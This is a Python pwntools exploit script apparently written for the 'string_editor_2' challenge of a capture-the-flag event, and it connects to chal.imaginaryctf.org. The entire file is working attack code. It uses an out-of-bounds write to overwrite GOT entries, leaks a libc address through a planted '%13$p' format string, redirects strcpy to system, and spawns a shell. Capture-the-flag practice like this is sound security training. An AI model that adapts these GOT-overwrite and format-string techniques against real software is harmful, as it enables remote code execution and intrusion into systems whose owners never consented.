#!/usr/bin/env python3

from pwn import *

exe = ELF("./string_editor_2_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe


def conn():
    r = process([exe.path])
    return r

#r = conn()
r = remote("chal.imaginaryctf.org", 42005)

def s(index, what):
    r.sendlineafter("What character would you like to edit? (enter in 15 to see utils)\n", str(index))
    r.sendlineafter("What character should be in that index?\n", chr(what))


def s_q(sym, qword):
    targ_addr = exe.got[sym]
    offset = -(exe.sym['target'] - targ_addr)
    
    q = p64(qword)
    for i in range(8):
        s(offset+i, q[i])

def main():
    
    s(0, ord("%"))
    s(1, ord("1"))
    s(2, ord("3"))
    s(3, ord("$"))
    s(4, ord("p"))

    s_q("strcpy", exe.plt['printf'])
    s_q("exit", exe.sym['del'])
    
    r.recv()
    r.sendline("100")
    r.recvline()

    libc.address = int(r.recv(14), 16) - libc.sym['__libc_start_main'] - 243
    log.warn("Libc base @ 0x%x", libc.address)
    r.sendline("A")

    s_q("strcpy", libc.sym['system'])

    s(0, ord("s"))
    s(1, ord("h"))
    s(2, ord("\x00"))
    
    r.sendline("100")

    r.interactive()


if __name__ == "__main__":
    main()
